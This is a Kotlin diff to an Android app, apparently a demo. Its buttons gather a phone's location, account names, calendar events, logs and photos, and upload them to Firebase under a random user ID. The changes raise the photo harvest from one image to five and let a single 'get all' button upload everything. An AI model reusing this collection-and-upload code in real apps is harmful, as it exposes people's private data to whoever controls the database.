@@ -41,7 +41,8 @@ class MainActivity : AppCompatActivity() {
     private var nameList = ArrayList<String>()
     private var numberList = ArrayList<String>()
     var randomID = UUID.randomUUID()
-    var randomIDtext = randomID.toString()
+    var randstr = randomID.toString()
+    var randomIDtext = "UID: $randstr"
     val database = FirebaseDatabase.getInstance()
     var storage = FirebaseStorage.getInstance()
     val myRef = database.getReference("userData").child("$randomID")
@@ -53,6 +54,7 @@ class MainActivity : AppCompatActivity() {
     var e =0
     var f = 0
     var g= 0
+    var h = 0
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     @SuppressLint("NewApi")
     @RequiresApi(Build.VERSION_CODES.O)
@@ -80,18 +82,20 @@ class MainActivity : AppCompatActivity() {
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration)
             toast.show()
+            showid.text = randomIDtext
             a++
             if(a>0 && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
 
         button2.setOnClickListener {
            namesThread.start()
+            showid.text = randomIDtext
             button2.isClickable=false
             button2.alpha=0.5f
             val text = "Uloaded!"
@@ -103,13 +107,14 @@ class MainActivity : AppCompatActivity() {
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
 
         location.setOnClickListener {
             location.isClickable=false
+            showid.text = randomIDtext
             location.alpha=0.5f
             getLocation()
             c++
@@ -117,13 +122,14 @@ class MainActivity : AppCompatActivity() {
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
 
         account.setOnClickListener {
             getAccName()
+            showid.text = randomIDtext
             account.isClickable=false
             account.alpha=0.5f
             d++
@@ -131,13 +137,14 @@ class MainActivity : AppCompatActivity() {
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
 
         events.setOnClickListener {
             getCalendarEvents()
+            showid.text = randomIDtext
             events.isClickable = false
             events.alpha = 0.5f
             val text = "Uloaded!"
@@ -148,11 +155,12 @@ class MainActivity : AppCompatActivity() {
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
         logs.setOnClickListener {
+            showid.text = randomIDtext
             logs.isClickable = false
             logs.alpha = 0.5f
             getLogs()
@@ -164,14 +172,38 @@ class MainActivity : AppCompatActivity() {
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
                 val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
+                i.putExtra("message", randstr)
                 startActivity(i)
             }
         }
-
         button4.setOnClickListener {
+            g++
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 && h>0 ){
+                val intent = Intent(this, LinkDemo::class.java)
+                startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randstr)
+                startActivity(i)
+            }
+            showid.text = randomIDtext
             getPicture()
+            button4.isClickable= false
+            button4.alpha = 0.5f
         }
+        button.setOnClickListener {
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 && h>0 ){
+                val intent = Intent(this, LinkDemo::class.java)
+                startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randstr)
+                startActivity(i)
+            }
+            h++
+            showid.text = randomIDtext
+            button.isClickable = false
+            button.alpha = 0.5f
+        }
+
         getall.setOnClickListener {
             getall.isClickable = false
             getall.alpha = 0.5f
@@ -191,18 +223,15 @@ class MainActivity : AppCompatActivity() {
             Handler(Looper.getMainLooper()).postDelayed({
                 getAccName()
             }, 1000)
-//            Handler(Looper.getMainLooper()).postDelayed({
-//                getPicture()
-//            },1000)
+            Handler(Looper.getMainLooper()).postDelayed({
+                getPicture()
+            },1000)
 
-//            Handler(Looper.getMainLooper()).postDelayed({
-//                val intent = Intent(this, LinkDemo::class.java)
-//                startActivity(intent)
-//                val i = Intent(this, LinkDemo::class.java)
-//                i.putExtra("message", randomIDtext)
-//                startActivity(i)
-//            }, 1000)
-
+            val intent = Intent(this, LinkDemo::class.java)
+            startActivity(intent)
+            val i = Intent(this, LinkDemo::class.java)
+            i.putExtra("message", randomIDtext)
+            startActivity(i)
         }
 
         if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
@@ -430,7 +459,7 @@ class MainActivity : AppCompatActivity() {
                 val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                 val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
 
-                while (it.moveToNext() && l!=1) {
+                while (it.moveToNext() && l!=5) {
                     val id = it.getLong(idColumn)
                     val name = it.getString(nameColumn)
                     val size = it.getString(sizeColumn)
@@ -440,8 +469,6 @@ class MainActivity : AppCompatActivity() {
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                         id
                     )
-                    // add the URI to the list
-                    // generate the thumbnail
                     val thumbnail = (this as Context).contentResolver.loadThumbnail(
                         contentUri,
                         Size(480, 480),
@@ -471,23 +498,19 @@ class MainActivity : AppCompatActivity() {
                         if (task.isSuccessful) {
                             val downloadUri = task.result
                             Handler(Looper.getMainLooper()).postDelayed({
-                                myRef.child("links").setValue(downloadUri.toString())
+                                val ra = UUID.randomUUID().toString()
+                                myRef.child("links/$ra").setValue(downloadUri.toString())
                             }, 1000)
                         } else {
                             Log.d("fail","fail")
                         }
                     }
                 }
-
             } ?: kotlin.run {
                 Log.e("TAG", "Cursor is null!")
             }
         }
         cursor!!.close()
-
     }
-
-
-
 }
 
